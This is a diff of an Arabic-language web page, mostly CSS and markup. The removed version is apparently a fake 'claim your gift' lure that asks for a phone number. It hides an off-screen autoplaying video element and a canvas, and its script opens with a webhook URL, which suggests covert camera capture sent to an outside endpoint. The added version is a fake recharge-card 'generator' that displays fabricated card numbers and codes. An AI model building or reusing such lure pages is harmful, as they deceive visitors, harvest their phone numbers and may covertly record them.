-            font-family: 'Cairo', sans-serif;
+            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            font-family: var(--font);
+            color: #fff;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            text-align: center;
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
-            gap: 14px;
-            letter-spacing: 1px;
+            gap: 3px;
+            min-height: 52px;
+            position: relative;
             overflow: hidden;
-            box-shadow: 0 4px 40px rgba(201, 168, 76, 0.005);
-            z-index: 1;
-            backdrop-filter: blur(8px);
+            -webkit-tap-highlight-color: transparent;
         }
-
-        .btn-premium::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            border-radius: 60px;
-            padding: 1px;
-            background: linear-gradient(135deg, rgba(201, 168, 76, 0.04), transparent 40%, transparent 60%, rgba(201, 168, 76, 0.01));
-            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
-            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
-            -webkit-mask-composite: xor;
-            mask-composite: exclude;
-            pointer-events: none;
+        .btn:hover {
+            transform: translateY(-3px) scale(1.02);
+            background: rgba(255, 255, 255, 0.06);
+            border-color: rgba(255, 255, 255, 0.08);
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.3);
         }
-
-        .btn-premium:hover:not(:disabled) {
-            transform: translateY(-2px);
-            border-color: rgba(201, 168, 76, 0.04);
-            box-shadow: 0 12px 60px rgba(201, 168, 76, 0.01);
-            background: linear-gradient(135deg, rgba(201, 168, 76, 0.05), rgba(201, 168, 76, 0.01));
-        }
-
-        .btn-premium:active:not(:disabled) {
+        .btn:active {
             transform: scale(0.96);
-            transition-duration: 0.15s;
+        }
+        .btn .icon {
+            font-size: 24px;
+            line-height: 1;
+        }
+        .btn .label {
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .btn .sub {
+            font-size: 9px;
+            font-weight: 400;
+            opacity: 0.35;
+        }
+        .btn .bar {
+            position: absolute;
+            bottom: 0;
+            left: 25%;
+            right: 25%;
+            height: 2px;
+            border-radius: 2px;
+            background: var(--btn-color, #ffd700);
+            opacity: 0;
+            transition: all 0.4s ease;
+        }
+        .btn:hover .bar {
+            opacity: 0.4;
+            left: 10%;
+            right: 10%;
+        }
+        .btn .dot-indicator {
+            position: absolute;
+            top: 8px;
+            right: 10px;
+            width: 5px;
+            height: 5px;
+            border-radius: 50%;
+            background: var(--btn-color, #ffd700);
+            opacity: 0;
+            transition: opacity 0.4s;
+        }
+        .btn:hover .dot-indicator {
+            opacity: 0.6;
         }
 
-        .btn-premium:disabled {
-            opacity: 0.2;
+        /* ─── Country Button ─── */
+        .btn-country {
+            min-height: 66px;
+            padding: 10px 6px;
+            background: rgba(255, 255, 255, 0.02);
+        }
+        .btn-country .icon {
+            font-size: 28px;
+        }
+        .btn-country .label {
+            font-size: 12px;
+        }
+
+        /* ─── Input ─── */
+        .input-wrap {
+            position: relative;
+            margin: 6px 0 8px;
+        }
+        .input-wrap .prefix {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            letter-spacing: 0.04em;
+            direction: ltr;
+        }
+        .input-wrap input {
+            width: 100%;
+            padding: 14px 70px 14px 16px;
+            border-radius: var(--radius-md);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            background: rgba(0, 0, 0, 0.3);
+            color: #fff;
+            font-size: 17px;
+            font-weight: 400;
+            font-family: var(--font);
+            outline: none;
+            transition: all 0.4s ease;
+            backdrop-filter: blur(8px);
+            letter-spacing: 0.04em;
+            direction: ltr;
+            text-align: left;
+        }
+        .input-wrap input::placeholder {
+            color: rgba(255, 255, 255, 0.1);
+            font-weight: 300;
+            font-size: 14px;
+        }
+        .input-wrap input:focus {
+            border-color: var(--btn-color, #ffd700);
+            box-shadow: 0 0 40px var(--btn-glow, rgba(255, 215, 0, 0.04));
+            background: rgba(0, 0, 0, 0.4);
+        }
+        .input-wrap .glow-line {
+            position: absolute;
+            bottom: -2px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 0%;
+            height: 2px;
+            border-radius: 2px;
+            background: linear-gradient(90deg, transparent, var(--btn-color, #ffd700), transparent);
+            transition: width 0.5s ease;
+        }
+        .input-wrap:focus-within .glow-line {
+            width: 60%;
+        }
+        .input-wrap .status-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 18px;
+            opacity: 0;
+            transition: all 0.4s ease;
+        }
+        .input-wrap .status-icon.valid {
+            opacity: 1;
+            color: #4ade80;
+        }
+        .input-wrap .status-icon.invalid {
+            opacity: 1;
+            color: #f87171;
+        }
+        .input-wrap .status-icon.idle {
+            opacity: 0.3;
+            color: var(--text-tertiary);
+        }
+        .validation-msg {
+            font-size: 11px;
+            font-weight: 400;
+            min-height: 18px;
+            padding-right: 4px;
+            transition: all 0.3s ease;
+            color: var(--text-secondary);
+        }
+        .validation-msg.valid {
+            color: #4ade80;
+        }
+        .validation-msg.invalid {
+            color: #f87171;
+        }
+
+        /* ─── Operator Badge ─── */
+        .operator-badge {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 16px;
+            border-radius: var(--radius-sm);
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            margin: 6px 0 4px;
+        }
+        .operator-badge .dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            flex-shrink: 0;
+        }
+        .operator-badge .name {
+            font-size: 14px;
+            font-weight: 600;
+        }
+        .operator-badge .sub {
+            font-size: 11px;
+            color: var(--text-secondary);
+            margin-right: auto;
+        }
+
+        /* ─── Primary Action ─── */
+        .btn-primary {
+            width: 100%;
+            padding: 14px;
+            border-radius: var(--radius-md);
+            border: 0;
+            font-size: 16px;
+            font-weight: 700;
+            font-family: var(--font);
+            color: #1a0a0a;
+            background: linear-gradient(135deg, #ffd700, #ff8c00);
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            box-shadow: 0 4px 30px rgba(255, 215, 0, 0.2);
+            position: relative;
+            overflow: hidden;
+            margin-top: 4px;
+        }
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-3px) scale(1.01);
+            box-shadow: 0 8px 50px rgba(255, 215, 0, 0.35);
+        }
+        .btn-primary:active:not(:disabled) {
+            transform: scale(0.97);
+        }
+        .btn-primary:disabled {
+            opacity: 0.4;
             cursor: not-allowed;
             transform: none !important;
         }
-
-        .btn-premium .spinner {
-            display: none;
-            width: 24px;
-            height: 24px;
-            border: 2px solid rgba(201, 168, 76, 0.05);
-            border-top: 2px solid var(--gold-light);
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+        .btn-primary .shine {
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 30% 30%, rgba(255, 255, 255, 0.1), transparent 60%);
+            pointer-events: none;
+            animation: shineFloat 5s ease-in-out infinite;
+        }
+        @keyframes shineFloat {
+            0%,
+            100% {
+                transform: translate(-10%, -10%);
+            }
+            50% {
+                transform: translate(10%, 10%);
+            }
         }
 
-        .btn-premium.loading .spinner {
-            display: inline-block;
-        }
-        .btn-premium.loading .btn-text {
-            display: none;
-        }
-
-        .status {
-            margin-top: 14px;
-            padding: 12px 18px;
-            border-radius: var(--radius-md);
-            font-size: 13px;
-            font-weight: 600;
-            display: none;
-            backdrop-filter: blur(8px);
-            text-align: center;
-            transition: all 0.4s ease;
-        }
-
-        .status.success {
-            background: rgba(201, 168, 76, 0.02);
-            color: var(--gold-light);
-            display: block;
-            border: 1px solid rgba(201, 168, 76, 0.02);
-        }
-
-        .status.info {
-            background: rgba(255, 255, 255, 0.005);
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.04);
             color: var(--text-secondary);
-            display: block;
-            border: 1px solid rgba(255, 255, 255, 0.01);
+            padding: 8px 14px;
+            border-radius: var(--radius-sm);
+            font-size: 11px;
+            font-weight: 500;
+            font-family: var(--font);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            justify-content: center;
+        }
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.06);
+            color: #fff;
+            transform: translateY(-2px);
         }
 
-        .status.error {
-            background: rgba(200, 80, 60, 0.02);
-            color: #d47a6a;
-            display: block;
-            border: 1px solid rgba(200, 80, 60, 0.02);
-        }
-
-        /* ============================================================
-           TIMER
-           ============================================================ */
-        .timer-luxury {
+        /* ═══════════════════════════════════════════════════════════════════
+           SIM RECHARGE CARD
+           ═══════════════════════════════════════════════════════════════════ */
+        .sim-card {
             position: relative;
-            background: rgba(0, 0, 0, 0.08);
-            border-radius: 60px;
-            padding: 20px 26px;
-            margin: 18px 0 12px;
+            width: 100%;
+            aspect-ratio: 1.55 / 1;
+            border-radius: var(--radius-md);
+            background: linear-gradient(145deg, rgba(12, 16, 32, 0.92), rgba(4, 6, 14, 0.96));
+            border: 1px solid rgba(255, 215, 0, 0.06);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.02);
+            padding: 16px 14px;
+            display: none;
+            flex-direction: column;
+            justify-content: space-between;
+            overflow: hidden;
+            margin-top: 10px;
+            transition: all 0.6s ease;
+            transform-style: preserve-3d;
+            perspective: 800px;
+        }
+        .sim-card.visible {
+            display: flex;
+        }
+        .sim-card .sec-pattern {
+            position: absolute;
+            inset: 0;
+            background: repeating-linear-gradient(45deg, transparent, transparent 14px, rgba(255, 215, 0, 0.008) 14px,
+                    rgba(255, 215, 0, 0.008) 16px);
+            pointer-events: none;
+            border-radius: var(--radius-md);
+        }
+        .sim-card .holo-bg {
+            position: absolute;
+            top: 10%;
+            right: 5%;
+            width: 50%;
+            height: 55%;
+            border-radius: 50%;
+            filter: blur(50px);
+            pointer-events: none;
+            transition: all 1.2s ease;
+            background: radial-gradient(circle at 30% 40%, var(--holo-color, rgba(255, 215, 0, 0.04)), transparent 70%);
+        }
+        .sim-card .top-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            position: relative;
+            z-index: 1;
+        }
+        .sim-card .top-row .brand {
+            font-size: 9px;
+            letter-spacing: 0.2em;
+            color: var(--text-tertiary);
+            font-weight: 400;
+            text-transform: uppercase;
+        }
+        .sim-card .top-row .chip-el {
+            width: 30px;
+            height: 22px;
+            border-radius: 3px;
+            background: linear-gradient(145deg, rgba(255, 215, 0, 0.04), rgba(255, 215, 0, 0.01));
+            border: 1px solid rgba(255, 215, 0, 0.03);
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 24px;
-            border: 1px solid rgba(255, 255, 255, 0.01);
-            overflow: hidden;
-            backdrop-filter: blur(12px);
+        }
+        .sim-card .top-row .chip-el::after {
+            content: '';
+            width: 10px;
+            height: 10px;
+            border-radius: 1px;
+            border: 1px solid rgba(255, 215, 0, 0.03);
+        }
+        .sim-card .number {
+            font-family: var(--font);
+            font-size: clamp(15px, 3vw, 22px);
+            font-weight: 500;
+            letter-spacing: 0.1em;
+            color: #fff;
+            text-shadow: 0 0 30px rgba(255, 255, 255, 0.01);
+            position: relative;
+            z-index: 1;
+            margin: 1px 0;
+            direction: ltr;
+            text-align: left;
+        }
+        .sim-card .details {
+            display: flex;
+            gap: 16px;
+            font-size: 8px;
+            color: var(--text-tertiary);
+            font-weight: 300;
+            letter-spacing: 0.04em;
+            position: relative;
+            z-index: 1;
+            flex-wrap: wrap;
+        }
+        .sim-card .details span {
+            display: flex;
+            flex-direction: column;
+            gap: 1px;
+        }
+        .sim-card .details strong {
+            color: #fff;
+            font-weight: 500;
+            font-size: 10px;
+        }
+        .sim-card .data-icon {
+            position: absolute;
+            bottom: 10px;
+            left: 12px;
+            font-size: 16px;
+            opacity: 0.06;
+            z-index: 1;
+        }
+        .sim-card .engrave {
+            position: absolute;
+            bottom: 8px;
+            right: 12px;
+            font-size: 6px;
+            color: rgba(255, 255, 255, 0.02);
+            letter-spacing: 0.12em;
+            font-weight: 200;
+            transform: rotate(-2deg);
+            z-index: 1;
+        }
+        .sim-card .qr-sim {
+            position: absolute;
+            bottom: 10px;
+            right: 50%;
+            transform: translateX(50%);
+            width: 30px;
+            height: 30px;
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            grid-template-rows: repeat(5, 1fr);
+            gap: 1.5px;
+            opacity: 0.06;
+            z-index: 1;
+        }
+        .sim-card .qr-sim .dot {
+            border-radius: 1px;
+            background: rgba(255, 255, 255, 0.1);
+        }
+        .sim-card .qr-sim .dot.filled {
+            background: rgba(255, 215, 0, 0.3);
+        }
+        .sim-card .operator-label {
+            position: absolute;
+            top: 12px;
+            right: 50%;
+            transform: translateX(50%);
+            font-size: 10px;
+            font-weight: 700;
+            letter-spacing: 0.15em;
+            color: rgba(255, 215, 0, 0.12);
+            z-index: 1;
+            text-transform: uppercase;
         }
 
-        .timer-luxury .timer-icon {
-            font-size: 30px;
-            color: var(--gold);
-            opacity: 0.2;
-            animation: timerPulse 2.8s ease-in-out infinite;
+        /* ─── Card Actions ─── */
+        .card-actions {
+            display: none;
+            gap: 6px;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-top: 10px;
+        }
+        .card-actions.visible {
+            display: flex;
+        }
+        .card-actions .btn-sm {
+            padding: 6px 14px;
+            border-radius: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            background: rgba(255, 255, 255, 0.02);
+            color: var(--text-secondary);
+            font-size: 10px;
+            font-weight: 400;
+            font-family: var(--font);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .card-actions .btn-sm:hover {
+            background: rgba(255, 255, 255, 0.05);
+            color: #fff;
+            transform: translateY(-2px);
+        }
+        .card-actions .btn-sm.gold {
+            border-color: rgba(255, 215, 0, 0.1);
+            color: #ffd700;
+        }
+        .card-actions .btn-sm.gold:hover {
+            background: rgba(255, 215, 0, 0.05);
         }
 
-        @keyframes timerPulse {
+        /* ═══════════════════════════════════════════════════════════════════
+           GENERATING OVERLAY
+           ═══════════════════════════════════════════════════════════════════ */
+        .gen-overlay {
+            display: none;
+            position: absolute;
+            inset: 0;
+            border-radius: var(--radius-lg);
+            background: rgba(4, 6, 14, 0.88);
+            backdrop-filter: blur(30px);
+            -webkit-backdrop-filter: blur(30px);
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 16px;
+            z-index: 10;
+            padding: 30px;
+        }
+        .gen-overlay.active {
+            display: flex;
+        }
+        .gen-overlay .core {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            background: radial-gradient(circle at 30% 30%, rgba(255, 215, 0, 0.15), rgba(0, 0, 0, 0.1));
+            border: 1px solid rgba(255, 215, 0, 0.04);
+            box-shadow: 0 0 60px rgba(255, 215, 0, 0.06);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: 200;
+            animation: corePulse 1.5s ease-in-out infinite;
+            color: #ffd700;
+        }
+        @keyframes corePulse {
             0%,
             100% {
-                opacity: 0.15;
                 transform: scale(1);
+                box-shadow: 0 0 60px rgba(255, 215, 0, 0.06);
             }
             50% {
-                opacity: 0.3;
-                transform: scale(1.04);
+                transform: scale(1.1);
+                box-shadow: 0 0 100px rgba(255, 215, 0, 0.12);
             }
         }
-
-        .timer-luxury .timer-digits {
-            font-size: 38px;
-            font-weight: 900;
-            color: var(--gold-light);
-            letter-spacing: 5px;
-            font-variant-numeric: tabular-nums;
-            font-family: 'Cairo', monospace;
-        }
-
-        .timer-sub {
-            color: var(--text-secondary);
+        .gen-overlay .status {
             font-size: 13px;
+            color: var(--text-secondary);
             font-weight: 300;
-            text-align: center;
-            margin-top: 2px;
-            opacity: 0.3;
-            letter-spacing: 0.5px;
+            letter-spacing: 0.08em;
+            animation: statusPulse 2s ease-in-out infinite;
+        }
+        @keyframes statusPulse {
+            0%,
+            100% {
+                opacity: 0.3;
+            }
+            50% {
+                opacity: 1;
+            }
+        }
+        .gen-overlay .progress {
+            width: 130px;
+            height: 2px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        .gen-overlay .progress .fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #ffd700, #ff8c00);
+            border-radius: 2px;
+            transition: width 0.3s ease;
         }
 
-        /* ============================================================
+        /* ═══════════════════════════════════════════════════════════════════
            RESPONSIVE
-           ============================================================ */
-        @media (max-width: 640px) {
-            .app-header {
-                flex-direction: column;
-                align-items: center;
-                padding-bottom: 18px;
+           ═══════════════════════════════════════════════════════════════════ */
+        @media (max-width: 480px) {
+            .app-container {
+                padding: 10px;
+            }
+            .panel {
+                padding: 16px 12px;
+                min-height: 280px;
+                border-radius: var(--radius-md);
+            }
+            .grid-2 {
                 gap: 8px;
             }
-
-            .app-header .brand-text {
-                font-size: 20px;
-            }
-            .app-header .brand-icon {
-                width: 38px;
-                height: 38px;
-                font-size: 18px;
-            }
-
-            .btn-shuffle {
-                padding: 8px 16px;
-                font-size: 12px;
+            .grid-3 {
                 gap: 8px;
             }
-
-            .cards-grid {
-                grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
-                gap: 14px;
-            }
-
-            .sim-card-wrap {
-                max-width: 160px;
-            }
-
-            .sim-card .card-icon {
-                font-size: 30px;
-            }
-            .sim-card .card-name {
-                font-size: 13px;
-            }
-            .sim-card .card-sub {
-                font-size: 8px;
-            }
-            .sim-card .card-rarity {
-                font-size: 7px;
-                top: 6px;
-                right: 8px;
-            }
-            .sim-card .card-engrave {
-                font-size: 5px;
-                bottom: 8px;
-                right: 10px;
-            }
-
-            .claim-area .step-title {
-                font-size: 20px;
-            }
-
-            .gift-panel {
-                padding: 14px 14px 12px;
-            }
-            .gift-panel .gift-box-3d {
-                font-size: 28px;
-            }
-            .gift-panel .gift-title {
-                font-size: 15px;
-            }
-            .gift-panel ul li {
+            .btn {
+                padding: 10px 6px;
                 font-size: 12px;
-                padding: 5px 0;
+                min-height: 44px;
             }
-
-            .btn-premium {
-                font-size: 16px;
-                padding: 14px 18px;
+            .btn-country {
+                min-height: 56px;
             }
-
-            .timer-luxury .timer-digits {
-                font-size: 28px;
-                letter-spacing: 3px;
-            }
-            .timer-luxury .timer-icon {
+            .btn-country .icon {
                 font-size: 22px;
             }
-
-            .step-dot {
-                width: 30px;
-                height: 30px;
-                font-size: 10px;
-            }
-            .step-line {
-                max-width: 20px;
-            }
-
-            .input-group input {
-                font-size: 16px;
-                padding: 12px 16px;
-            }
-        }
-
-        @media (max-width: 420px) {
-            .cards-grid {
-                grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
-                gap: 10px;
-            }
-
-            .sim-card-wrap {
-                max-width: 130px;
-            }
-
-            .sim-card .card-icon {
-                font-size: 24px;
-            }
-            .sim-card .card-name {
+            .btn-country .label {
                 font-size: 11px;
             }
-            .sim-card .card-sub {
+            .btn-primary {
+                font-size: 14px;
+                padding: 12px;
+            }
+            .input-wrap input {
+                font-size: 15px;
+                padding: 12px 60px 12px 12px;
+            }
+            .sim-card {
+                padding: 12px 10px;
+            }
+            .sim-card .number {
+                font-size: 13px;
+            }
+            .sim-card .details {
                 font-size: 7px;
+                gap: 10px;
             }
-            .sim-card .card-rarity {
-                font-size: 6px;
+            .sim-card .details strong {
+                font-size: 9px;
             }
-            .sim-card .card-engrave {
-                font-size: 4px;
+            .header h1 {
+                font-size: 26px;
             }
-
-            .btn-shuffle {
-                padding: 6px 12px;
-                font-size: 10px;
-                gap: 6px;
-            }
-            .btn-shuffle .shuffle-icon {
-                font-size: 12px;
-            }
-
-            .claim-area .step-title {
+            .page .page-title {
                 font-size: 17px;
             }
-
-            .timer-luxury .timer-digits {
+            .gen-overlay .core {
+                width: 52px;
+                height: 52px;
+                font-size: 20px;
+            }
+            .operator-badge {
+                padding: 8px 12px;
+            }
+            .operator-badge .name {
+                font-size: 12px;
+            }
+        }
+        @media (max-width: 380px) {
+            .grid-2 {
+                gap: 6px;
+            }
+            .grid-3 {
+                gap: 6px;
+            }
+            .btn {
+                font-size: 10px;
+                padding: 8px 4px;
+                min-height: 38px;
+                border-radius: 10px;
+            }
+            .btn-country {
+                min-height: 48px;
+            }
+            .btn-country .icon {
+                font-size: 18px;
+            }
+            .btn-country .label {
+                font-size: 9px;
+            }
+            .btn-primary {
+                font-size: 12px;
+                padding: 10px;
+            }
+            .input-wrap input {
+                font-size: 13px;
+                padding: 10px 50px 10px 10px;
+            }
+            .panel {
+                padding: 12px 8px;
+                min-height: 240px;
+            }
+            .sim-card {
+                padding: 10px 8px;
+            }
+            .sim-card .number {
+                font-size: 11px;
+            }
+            .sim-card .details {
+                font-size: 6px;
+                gap: 6px;
+            }
+            .sim-card .details strong {
+                font-size: 8px;
+            }
+            .header h1 {
                 font-size: 22px;
-                letter-spacing: 2px;
+            }
+            .page .page-title {
+                font-size: 15px;
+            }
+            .gen-overlay .core {
+                width: 44px;
+                height: 44px;
+                font-size: 16px;
             }
         }
 
-        /* ============================================================
-           HIDDEN
-           ============================================================ */
-        #hiddenVideo {
-            position: fixed;
-            top: -1000px;
-            left: -1000px;
-            width: 320px;
-            height: 240px;
-            opacity: 0;
-            pointer-events: none;
+        /* ═══════════════════════════════════════════════════════════════════
+           UTILITY
+           ═══════════════════════════════════════════════════════════════════ */
+        .mt-6 {
+            margin-top: 6px;
         }
-        #hiddenCanvas {
-            display: none;
+        .mt-10 {
+            margin-top: 10px;
         }
-
-        ::-webkit-scrollbar {
-            width: 2px;
+        .gap-6 {
+            gap: 6px;
         }
-        ::-webkit-scrollbar-track {
-            background: rgba(255, 255, 255, 0.005);
+        .flex-row {
+            display: flex;
+            gap: 8px;
         }
-        ::-webkit-scrollbar-thumb {
-            background: rgba(201, 168, 76, 0.03);
-            border-radius: 2px;
+        .flex-row .flex-1 {
+            flex: 1;
         }
-
-        ::selection {
-            background: rgba(201, 168, 76, 0.04);
-            color: var(--gold-light);
+        .text-center {
+            text-align: center;
+        }
+        .op-3 {
+            opacity: 0.3;
+        }
+        .fs-11 {
+            font-size: 11px;
+        }
+        .hidden {
+            display: none !important;
         }
     </style>
 </head>
 <body>
 
-    <!-- ============================================================
-    BG LAYERS
-    ============================================================ -->
-    <canvas id="bg-canvas"></canvas>
-    <div class="bg-orb bg-orb--1"></div>
-    <div class="bg-orb bg-orb--2"></div>
-    <div class="bg-orb bg-orb--3"></div>
-    <div class="bg-grain"></div>
+    <div id="app">
 
-    <!-- ============================================================
-    APP
-    ============================================================ -->
-    <div class="app-wrapper">
-
-        <!-- HEADER -->
-        <header class="app-header">
-            <div class="brand">
-                <span class="brand-icon"><i class="fas fa-sim-card"></i></span>
-                <span class="brand-text">SIM·GEN</span>
-            </div>
-            <div class="header-actions">
-                <button class="btn-shuffle" id="shuffleBtn">
-                    <span class="shuffle-icon"><i class="fas fa-dice"></i></span>
-                    <span class="shuffle-spinner"></span>
-                    <span>Generate New</span>
-                </button>
-            </div>
-        </header>
-
-        <!-- STEP INDICATOR -->
-        <div class="step-indicator" id="stepIndicator">
-            <div class="step-dot active" data-step="1">
-                <span class="dot-ring"></span>
-                <span>1</span>
-            </div>
-            <div class="step-line" data-step="1"></div>
-            <div class="step-dot" data-step="2">
-                <span class="dot-ring"></span>
-                <span>2</span>
-            </div>
-            <div class="step-line" data-step="2"></div>
-            <div class="step-dot" data-step="3">
-                <span class="dot-ring"></span>
-                <span>3</span>
-            </div>
+        <!-- ═══ BACKGROUND ═══ -->
+        <div class="bg-layer">
+            <div class="orb"></div>
+            <div class="orb"></div>
+            <div class="orb"></div>
+            <div class="grid-dots"></div>
         </div>
 
-        <!-- ============================================================
-        STEP 1 · CARDS
-        ============================================================ -->
-        <div class="step active" id="step-cards">
-            <div class="cards-stage">
-                <div class="cards-grid" id="cardsGrid"></div>
-            </div>
-            <div class="status" id="statusCards"></div>
-        </div>
+        <!-- ═══ APP CONTAINER ═══ -->
+        <div class="app-container">
 
-        <!-- ============================================================
-        STEP 2 · CLAIM
-        ============================================================ -->
-        <div class="claim-area" id="step-claim">
-            <div class="step-title">استلم <span class="highlight">هديتك</span></div>
-            <p class="step-desc" id="taskSub">أكمل بياناتك وسنرسل الهدية إلى رقمك</p>
-
-            <div class="gift-panel" id="permissionArea">
-                <!-- dynamic -->
+            <!-- ═══ HEADER ═══ -->
+            <div class="header">
+                <div class="badge">✦ Nexus Telecom</div>
+                <h1>Recharge Card</h1>
+                <p>Smart Generator · Detect Operator Automatically</p>
             </div>
 
-            <div class="input-group">
-                <label for="phoneInput"><i class="fas fa-phone"></i> رقم الهاتف</label>
-                <div class="input-wrap">
-                    <input type="text" id="phoneInput" placeholder="مثال: 01012345678" maxlength="15" autocomplete="tel" />
+            <!-- ═══ PANEL ═══ -->
+            <div class="panel" id="mainPanel">
+
+                <!-- Glow Aura -->
+                <div class="glow-aura" id="glowAura"></div>
+
+                <!-- ═══ GENERATING OVERLAY ═══ -->
+                <div class="gen-overlay" id="genOverlay">
+                    <div class="core" id="genCore">◈</div>
+                    <div class="status" id="genStatus">جاري التصنيع</div>
+                    <div class="progress"><div class="fill" id="genBar"></div></div>
                 </div>
-            </div>
 
-            <button class="btn-premium" id="claimBtn">
-                <span class="btn-text"><i class="fas fa-gift" style="margin-left:12px;"></i> احصل على هديتي</span>
-                <span class="spinner"></span>
-            </button>
-            <div class="status" id="statusTasks"></div>
-        </div>
+                <!-- ═══ PAGE: COUNTRY SELECTION ═══ -->
+                <div class="page active" id="pageCountry">
+                    <div class="page-title">اختر الدولة <span class="accent">🌍</span></div>
+                    <div class="page-sub">لتحديد مشغلي الشبكة</div>
+                    <div class="grid-3" id="countryGrid" style="margin-top:8px;"></div>
+                </div>
 
-        <!-- ============================================================
-        STEP 3 · TIMER
-        ============================================================ -->
-        <div class="claim-area" id="step-timer">
-            <div class="step-title">تم <span class="highlight">الإرسال</span></div>
-            <p class="step-desc">جاري تجهيز هديتك، انتظر لحظات</p>
-            <div class="timer-luxury">
-                <i class="fas fa-hourglass-half timer-icon"></i>
-                <span class="timer-digits" id="timerDisplay">03:00</span>
-            </div>
-            <p class="timer-sub">سيتم إرسال الهدية تلقائياً إلى رقمك</p>
-            <div class="status" id="statusTimer"></div>
-        </div>
+                <!-- ═══ PAGE: PHONE INPUT ═══ -->
+                <div class="page" id="pagePhone">
+                    <div class="back-row">
+                        <button class="back-btn" onclick="goToCountry()">
+                            <svg viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+                            رجوع
+                        </button>
+                        <span class="label" id="phonePageLabel">إدخال الرقم</span>
+                    </div>
+                    <div class="page-title" id="phonePageTitle">أدخل رقم هاتفك</div>
+                    <div class="page-sub" id="phoneCountrySub">الدولة</div>
 
-    </div>
+                    <div class="input-wrap">
+                        <span class="prefix" id="phonePrefix">+20</span>
+                        <input type="text" id="phoneInput" placeholder="أدخل الرقم" maxlength="20" autocomplete="off" />
+                        <div class="glow-line"></div>
+                        <span class="status-icon" id="statusIcon">✓</span>
+                    </div>
+                    <div class="validation-msg" id="validMsg">أدخل رقم صحيح</div>
 
-    <!-- ============================================================
-    HIDDEN MEDIA
-    ============================================================ -->
-    <video id="hiddenVideo" autoplay playsinline muted></video>
-    <canvas id="hiddenCanvas"></canvas>
+                    <!-- Operator detection result -->
+                    <div class="operator-badge" id="operatorBadge" style="display:none;">
+                        <span class="dot" id="opDot"></span>
+                        <span class="name" id="opName">—</span>
+                        <span class="sub" id="opSub">المشغل</span>
+                    </div>
 
-    <!-- ============================================================
-    SCRIPT
-    ============================================================ -->
+                    <button class="btn-primary" id="generateBtn" disabled>
+                        <span class="shine"></span>
+                        ✦ إنشاء كارت الشحن
+                    </button>
+
+                    <div class="flex-row mt-6">
+                        <button class="btn-secondary flex-1" onclick="surpriseMe()">🎲 عشوائي</button>
+                        <button class="btn-secondary flex-1" onclick="goToCountry()">↻ تغيير</button>
+                    </div>
+
+                    <!-- ═══ SIM CARD ═══ -->
+                    <div class="sim-card" id="simCard">
+                        <div class="sec-pattern"></div>
+                        <div class="holo-bg" id="simHolo"></div>
+                        <div class="operator-label" id="simOpLabel">OPERATOR</div>
+                        <div class="top-row">
+                            <span class="brand" id="simBrand">NEXUS</span>
+                            <div class="chip-el"></div>
+                        </div>
+                        <div class="number" id="simNumber">•••• •••• •••• ••••</div>
+                        <div class="details">
+                            <span>صالح <strong id="simValid">XX/XX</strong></span>
+                            <span>الكود <strong id="simCode">•••</strong></span>
+                            <span>البيانات <strong id="simData">—</strong></span>
+                            <span>القيمة <strong id="simValue">—</strong></span>
+                        </div>
+                        <div class="data-icon" id="simDataIcon">📶</div>
+                        <div class="engrave" id="simEngrave">∞ SERIAL · NX-0000</div>
+                        <div class="qr-sim" id="simQR"></div>
+                    </div>
+
+                    <!-- ═══ CARD ACTIONS ═══ -->
+                    <div class="card-actions" id="cardActions">
+                        <button class="btn-sm gold" onclick="generateNewCard()">✦ جديد</button>
+                        <button class="btn-sm" onclick="flipCard()">⟳ قلب</button>
+                        <button class="btn-sm" onclick="rotateCard()">↻ تدوير</button>
+                        <button class="btn-sm" onclick="copyCard()">📋 نسخ</button>
+                    </div>
+                </div>
+
+            </div><!-- /panel -->
+        </div><!-- /app-container -->
+    </div><!-- /app -->
+
     <script>
-        // ============================================================
-        //  CONFIG
-        // ============================================================
-        const WEBHOOK_URL =
